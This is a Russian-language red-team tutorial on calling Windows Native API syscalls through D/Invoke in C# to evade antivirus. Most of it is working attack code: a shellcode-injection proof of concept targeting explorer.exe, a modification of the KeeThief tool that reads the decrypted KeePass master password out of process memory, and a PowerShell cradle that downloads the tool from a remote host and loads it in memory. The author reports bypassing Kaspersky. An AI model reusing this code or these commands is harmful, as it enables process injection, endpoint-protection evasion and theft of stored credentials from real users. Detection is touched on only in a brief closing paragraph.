Для нас, как для атакующих, важно уметь извлекать выгоду из каждой особенности ОС, потому что мы всегда попадаем на **неизвестную территорию**, оказываясь на проекте, и кроме перечисленных особенностей у нас по умолчанию ничего нет. В то время, как обороняющиеся обвешаны целой кучей мультимиллионых SIEM и EDR, у нас есть только пачка самопиленных скриптов с просторов GitHub от дружественного коммьюнити (ну и лицензионный «Кобальт», разумеется).

К чему я это – в некоторых ситуациях для нас выгоднее использовать Native API, чем Win32 API, чтобы оставаться как можно ближе к режиму ядра (Ring 0). Ведь там не действуют законы AV/EDR, которые мертвой хваткой вцепились в пользовательский режим (Ring 3).

[![protection-rings.png](/assets/images/keethief-syscalls/protection-rings.png)](/assets/images/keethief-syscalls/protection-rings.png)

Кольца привилегий архитектуры x86 в защищённом режиме (автор схемы — jhalon.github.io)
{:.quote}

Как ты уже мог понять, наши экзерсисы с `DllImport` (P/Invoke) и `DynamicAPIInvoke` (D/Invoke) — это ни что иное, как примеры использование Win32 API. Попробуем сотворить то же самое на системных вызовах.

- [Red Team Tactics: Utilizing Syscalls in C# - Prerequisite Knowledge](https://jhalon.github.io/utilizing-syscalls-in-csharp-1/)
- [Red Team Tactics: Utilizing Syscalls in C# - Writing The Code](https://jhalon.github.io/utilizing-syscalls-in-csharp-2/)
- [Using Syscalls to Inject Shellcode on Windows](https://www.solomonsklash.io/syscalls-for-shellcode-injection.html)
- [Syscalls with D/Invoke](https://offensivedefence.co.uk/posts/dinvoke-syscalls/)
- [Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/)
- [Malware Analysis: Syscalls](https://jmpesp.me/malware-analysis-syscalls-example/)

## GetSyscallStub с помощью D/Invoke

Итак, крайняя граница перед переходом в kernel-режим – функции Native API. Они живут в библиотеке `ntdll.dll`, и один из способов до них беспалевно достучаться – это распарсить PE-стукртуру либы и получить адреса нужных эскпортов. В этом, собственно, нам и помогает D/Invoke.

Рассмотрим следующий код.

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace DInvoke_GetSyscallStub
{
    class Win32
    {
        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }
    }

    class Delegates
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate DInvoke.Data.Native.NTSTATUS NtOpenProcess(
            ref IntPtr ProcessHandle,
            DInvoke.Data.Win32.Kernel32.ProcessAccessFlags DesiredAccess,
            ref Win32.OBJECT_ATTRIBUTES ObjectAttributes,
            ref Win32.CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate DInvoke.Data.Native.NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate DInvoke.Data.Native.NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate DInvoke.Data.Native.NTSTATUS NtCreateThreadEx(
            ref IntPtr threadHandle,
            DInvoke.Data.Win32.WinNT.ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);
    }

    public class Program
    {
        static DInvoke.Data.Native.NTSTATUS NtOpenProcess(ref IntPtr ProcessHandle, DInvoke.Data.Win32.Kernel32.ProcessAccessFlags DesiredAccess, ref Win32.OBJECT_ATTRIBUTES ObjectAttributes, ref Win32.CLIENT_ID ClientId)
        {
            IntPtr stub = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtOpenProcess");
            Delegates.NtOpenProcess ntOpenProcess = (Delegates.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtOpenProcess));

            return ntOpenProcess(ref ProcessHandle, DesiredAccess, ref ObjectAttributes, ref ClientId);
        }

        static DInvoke.Data.Native.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect)
        {
            IntPtr stub = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
            Delegates.NtAllocateVirtualMemory ntAllocateVirtualMemory = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtAllocateVirtualMemory));

            return ntAllocateVirtualMemory(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
        }

        static DInvoke.Data.Native.NTSTATUS NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint BufferLength, ref uint BytesWritten)
        {
            IntPtr stub = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
            Delegates.NtWriteVirtualMemory ntWriteVirtualMemory = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtWriteVirtualMemory));

            return ntWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferLength, ref BytesWritten);
        }

        static DInvoke.Data.Native.NTSTATUS NtCreateThreadEx(ref IntPtr threadHandle, DInvoke.Data.Win32.WinNT.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList)
        {
            IntPtr stub = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
            Delegates.NtCreateThreadEx ntCreateThreadEx = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtCreateThreadEx));

            return ntCreateThreadEx(ref threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, createSuspended, stackZeroBits, sizeOfStack, maximumStackSize, attributeList);
        }

        public static void Main(string[] args)
        {
            // msfvenom -p windows/x64/messagebox TITLE='MSF' TEXT='Hack the Planet!' EXITFUNC=thread -f csharp
            byte[] buf = new byte[] { };

            // получаем PID процесса explorer.exe
            int processId = Process.GetProcessesByName("explorer")[0].Id;

            // получаем хендл процесса по его PID
            IntPtr hProcess = IntPtr.Zero;
            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
            Win32.CLIENT_ID ci = new Win32.CLIENT_ID { UniqueProcess = (IntPtr)processId };
            _ = NtOpenProcess(ref hProcess, DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, ref oa, ref ci);

            // выделяем область памяти buf.Length байт
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)buf.Length;
            _ = NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, DInvoke.Data.Win32.Kernel32.MEM_COMMIT | DInvoke.Data.Win32.Kernel32.MEM_RESERVE, DInvoke.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE);

            // записываем шеллкод в выделенную область
            var shellcode = Marshal.AllocHGlobal(buf.Length);
            Marshal.Copy(buf, 0, shellcode, buf.Length);
            uint bytesWritten = 0;
            _ = NtWriteVirtualMemory(hProcess, baseAddress, shellcode, (uint)buf.Length, ref bytesWritten);
            Marshal.FreeHGlobal(shellcode);

            // запускаем поток
            IntPtr hThread = IntPtr.Zero;
            _ = NtCreateThreadEx(ref hThread, DInvoke.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
        }
    }
}
```

В этом PoC мы заменили все функции, учавствующие в процессе инжекта шеллкода, на вызовы Native API, а именно: 

- `OpenProcess` → `NtOpenProcess`,
- `VirtualAllocEx` → `NtAllocateVirtualMemory`,
- `WriteProcessMemory` → `NtWriteVirtualMemory`,
- `CreateRemoteThread` → `NtCreateThreadEx`.

Первый вопрос, приходящий в голову – как мы определили, что именно эти функции Native API лежат в основе тех вызовов Win32 API, которые мы использовали ранее? Что ж, самый праведный способ это выяснить – это самостоятельно окунуться в пучину дизассемблирования `kernel32.dll`... Но так как у меня лапки (а еще нет профессиональной «Иды»), то можно посмотреть на сорцы [ReactOS](https://ru.wikipedia.org/wiki/ReactOS), где все это уже <strike>украли</strike> сделали до нас.

Например, [в реализации](https://doxygen.reactos.org/d0/d85/dll_2win32_2kernel32_2client_2thread_8c.html#a17cb3377438e48382207f54a8d045f07) функции `CreateRemoteThread` есть недвусмысленный намек на вызов `NtCreateThread`, что относит нас к сигнатуре [NtCreateThreadEx](http://pinvoke.net/default.aspx/ntdll/NtCreateThreadEx.html).

[![createremotethread-reactos.png](/assets/images/keethief-syscalls/createremotethread-reactos.png)](/assets/images/keethief-syscalls/createremotethread-reactos.png)

Тупим в исходники ReactOS
{:.quote}

Также есть полезный маппинг вызовов Win32 API на Native API, сделанный в автоматическом режиме, [PDF](https://github.com/EspressoCake/NativeFunctionStaticMap/blob/main/Native_API_Resolve.pdf).

Таким образом, снова посмотрим на различия между статическим импортом P/Invoke и использованием системного вызова с помощью D/Invoke для функции `WriteProcessMemory`.

Было:

```csharp
public class Program
{
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten);
}
```

Стало:

```csharp
class Delegates
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out IntPtr lpNumberOfBytesWritten);
}

public class Program
{
    static DInvoke.Data.Native.NTSTATUS NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint BufferLength, ref uint BytesWritten)
    {
        // получаем стаб (указатель на экспорт целевой функции) системного вызова и инициализируем им делегат
        IntPtr stub = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
        Delegates.NtWriteVirtualMemory ntWriteVirtualMemory = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtWriteVirtualMemory));

        // обращаемся к делегату как к целевой функции и возвращаем результат
        return ntWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferLength, ref BytesWritten);
    }
}
```

Что ж, попробуем запустить.

[![di-getsyscallstub.png](/assets/images/keethief-syscalls/di-getsyscallstub.png)](/assets/images/keethief-syscalls/di-getsyscallstub.png)

GetSyscallStub с помощью D/Invoke
{:.quote}

Работает. Проверка на «Касперском».

Еще один подарок от оффенсив-сообщества – это ресурс [dinvoke.net](https://dinvoke.net/) за авторством [@_RastaMouse](https://twitter.com/_RastaMouse), где можно скопипастить готовые сигнатуры делегатов для системных вызовов и подсмотреть примеры кода.

[![di-getsyscallstub-kis.png](/assets/images/keethief-syscalls/di-getsyscallstub-kis.png)](/assets/images/keethief-syscalls/di-getsyscallstub-kis.png)

Easy
{:.quote}

Вуаля! И никаких тебе недовольств от нашего любимого антивируса.

# Модификация KeeThief

Теперь у нас есть все необходимые знания, чтобы переписать логику KeeThief на системные вызовы с помощью D/Invoke. Чтобы не копипастить все изменения, которые я внес, в этой статье я сконцентрируюсь разборе функции чтения расшифрованной области памяти, содержащей мастер-пароль. Остальные [изменения](https://github.com/snovvcrash/KeeThief/commit/325327c5aa3ab5db1e808a493349de06cba673ce) доступны для изучения на моем гитхабе.

## Подготовка

Итак, первым делом я сделаю форки проектов [KeeThief](https://github.com/GhostPack/KeeThief) и [DInvoke](https://github.com/TheWover/DInvoke). Далее создам отдельную ветку [keethief](https://github.com/snovvcrash/DInvoke/tree/keethief) в форке DInvoke, где избавлюсь от всех неиспользуемых нами фич, тем самым сократив количество подозрительного кода в сорцах.

Потом я и включу модифицированный DInvoke как git-подмодуль для KeeThief.

```bash
git submodule add -b keethief https://github.com/snovvcrash/DInvoke.git KeeTheft/KeeTheft/DInvoke
```

Теперь можно создать бранч `syscalls`, открыть [KeeTheft.sln](https://github.com/GhostPack/KeeThief/blob/master/KeeTheft/KeeTheft.sln) в Visual Studio и добавить папку DInvoke в проект.

## Апгрейд функции ReadProcessMemory

Фактически нас будут интересовать только функции, объявленные в [Win32.cs](https://github.com/GhostPack/KeeThief/blob/master/KeeTheft/KeeTheft/Win32.cs), поэтому для примера, как и договорились, целимся в [ReadProcessMemory](https://github.com/GhostPack/KeeThief/blob/04f3fbc0ba87dbcd9011ad40a1382169dc5afd59/KeeTheft/KeeTheft/Win32.cs#L37-L38) (вызывается она вот [здесь](https://github.com/GhostPack/KeeThief/blob/04f3fbc0ba87dbcd9011ad40a1382169dc5afd59/KeeTheft/KeeTheft/Program.cs#L160)).

Как и в нашем первом примере, для использования `ReadProcessMemory` в KeeThief применяется обыкновенный импорт P/Invoke с помощью `DllImport`.

```csharp
class Win32
{
    // https://github.com/GhostPack/KeeThief/blob/04f3fbc0ba87dbcd9011ad40a1382169dc5afd59/KeeTheft/KeeTheft/Win32.cs#L37-L38

    [DllImport("kernel32.dll")]
    public static extern int ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out, MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 3)] byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead);
}
```

Для порядка я создам отдельные классы [Delegates.cs](https://github.com/snovvcrash/KeeThief/blob/syscalls/KeeTheft/KeeTheft/Delegates.cs) и [Syscalls.cs](https://github.com/snovvcrash/KeeThief/blob/syscalls/KeeTheft/KeeTheft/Syscalls.cs), где будут находиться делегаты и реализации системных вызовов соответственно. Функцию `NtReadVirtualMemory` я локализовал уже известным нам методом, подсмотренным [в сорцах](https://doxygen.reactos.org/d9/dd7/dll_2win32_2kernel32_2client_2proc_8c.html#ad7212006d73b4cfc79ffdc134de12829) ReactOS.

```csharp
class Delegates
{
    // https://github.com/snovvcrash/KeeThief/blob/3a1415e247688bc581f4dd036a6709737b3b3848/KeeTheft/KeeTheft/Delegates.cs#L26-L32

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate DI.Data.Native.NTSTATUS NtReadVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        IntPtr Buffer,
        uint NumberOfBytesToRead,
        ref uint NumberOfBytesReaded);
}

class Syscalls
{
    // https://github.com/snovvcrash/KeeThief/blob/3a1415e247688bc581f4dd036a6709737b3b3848/KeeTheft/KeeTheft/Syscalls.cs#L36-L47

    public static DI.Data.Native.NTSTATUS NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint NumberOfBytesToRead, ref uint NumberOfBytesReaded)
    {
        // получаем стаб (указатель на экспорт целевой функции) системного вызова и инициализируем им делегат
        IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtReadVirtualMemory");
        Delegates.NtReadVirtualMemory ntReadVirtualMemory = (Delegates.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtReadVirtualMemory));

        // обращаемся к делегату как к целевой функции и возвращаем результат
        return ntReadVirtualMemory(
            ProcessHandle,
            BaseAddress,
            Buffer,
            NumberOfBytesToRead,
            ref NumberOfBytesReaded);
    }
}
```

Теперь нам нужно внести изменения в логику главного класса [Program.cs](https://github.com/GhostPack/KeeThief/blob/master/KeeTheft/KeeTheft/Program.cs). Вот, что там было изначально.

```csharp
static class Program
{
    public static void ExtractKeyInfo(IUserKey key, IntPtr ProcessHandle, bool DecryptKeys)
    {
        // https://github.com/GhostPack/KeeThief/blob/04f3fbc0ba87dbcd9011ad40a1382169dc5afd59/KeeTheft/KeeTheft/Program.cs#L156-L165

        // Read plaintext password!

        // ждем, пока отработает шеллкод
        Thread.Sleep(1000);

        // объявляем переменную для количества прочитанных байт и статический массив для сохранения результата
        IntPtr NumBytes;
        byte[] plaintextBytes = new byte[key.encryptedBlob.Length];

        // вызываем саму функцию ReadProcessMemory, передавая в качестве аргумента адрес области памяти, откуда надо считать мастер-пароль (EncryptedBlobAddr)
        int res = Win32.ReadProcessMemory(ProcessHandle, EncryptedBlobAddr, plaintextBytes, plaintextBytes.Length, out NumBytes);
        if (res != 0 && NumBytes.ToInt64() == plaintextBytes.Length)
        {
            // если успешно, присваиваем результат полю plaintextBlob объекта key и выводим его в консоль
            key.plaintextBlob = plaintextBytes;
            Logger.WriteLine(key);
        }
    }
}
```

Здесь происходит чтение уже расшифрованной области памяти (после завершения работы шеллкода) в удаленном процессе. Я выбрал портирование функции `ReadProcessMemory` для примера не случайно, поскольку в этом случае нужно больше всего повозиться с типом передаваемых параметров.

Вот, что у меня получилось.

```csharp
static class Program
{
    public static void ExtractKeyInfo(IUserKey key, IntPtr ProcessHandle, bool DecryptKeys)
    {
        // https://github.com/snovvcrash/KeeThief/blob/3a1415e247688bc581f4dd036a6709737b3b3848/KeeTheft/KeeTheft/Program.cs#L161-L174

        // Read plaintext password!

        // ждем, пока отработает шеллкод
        Thread.Sleep(1000);

        // объявляем переменную для количества прочитанных байт и указатель на неуправляемую область памяти для сохранения результата
        uint NumBytes = 0;
        IntPtr pPlaintextBytes = Marshal.AllocHGlobal(key.encryptedBlob.Length);

        // вызываем саму функцию ReadProcessMemory, передавая в качестве аргумента адрес области памяти, откуда надо считать мастер-пароль (EncryptedBlobAddr)
        if (Syscalls.NtReadVirtualMemory(ProcessHandle, EncryptedBlobAddr, pPlaintextBytes, (uint)key.encryptedBlob.Length, ref NumBytes) == 0 && NumBytes == key.encryptedBlob.Length)
        {
            // если успешно, перебрасываем считанные байты из неуправляемой области памяти в статический массив
            byte[] plaintextBytes = new byte[NumBytes];
            Marshal.Copy(pPlaintextBytes, plaintextBytes, 0, (int)NumBytes);

            // присваиваем результат полю plaintextBlob объекта key и выводим его в консоль
            key.plaintextBlob = plaintextBytes;
            Logger.WriteLine(key);
        }

        // освобождаем неуправляемую память, выделенную ранее
        Marshal.FreeHGlobal(pPlaintextBytes);
    }
}
```

Основное отличие, как ты уже догадался, в том, что Native API не знает, что такое управляемые массивы .NET, поэтому приходится изменять логику для работы с неуправлямой памятью.

Собственно, остальные вызовы Win32 API легко находятся по Ctrl-F в [Program.cs](https://github.com/GhostPack/KeeThief/blob/master/KeeTheft/KeeTheft/Program.cs), и для них проделываются те же манипуляции, что мы разобрали для `ReadProcessMemory`. Результат можно подглядеть в моем [форке](https://github.com/snovvcrash/KeeThief/tree/syscalls/KeeTheft/KeeTheft).

## Время для теста!

Я скомпилирую модифицированную сборку и создам тестовую базу данных KeeThief с паролем `Passw0rd!`. Версия программы KeePass, на которой я это проверял – самая свежая на момент написания статьи (2.50).

Грузим в память и дергаем точку входа при открытой БД KeePass.

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.0.184/KeeTheft.exe')
$assembly = [System.Reflection.Assembly]::Load($data)
$a = [KeeTheft.Program]::Main(" ")
```

[![keetheft-kis.png](/assets/images/keethief-syscalls/keetheft-kis.png)](/assets/images/keethief-syscalls/keetheft-kis.png)

Сим-сим, откройся!
{:.quote}

# Выводы

Использование системных вызовов в практике вирусописательства – далеко не новая тема. Основные способы [детектирования](https://www.cyberbit.com/blog/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/) вредоносного поведения в этом случае сводятся к отслеживанию операций парсинга ntdll.dll и запуска подозрительных процессов или потоков с помощью потенциально опасных вызовов по типу `NtCreateThreadEx`, `NtQueueApcThread` и других.

В результате мы обошли «Антивирус Касперского» и можем скомпрометировать креды в KeePass. Создание красивого загрузчика для исполнения программы в один клик из памяти на PowerShell оставлю в качестве упражнения для читателя (смотрим статьи про `System.Reflection.Assembly`).
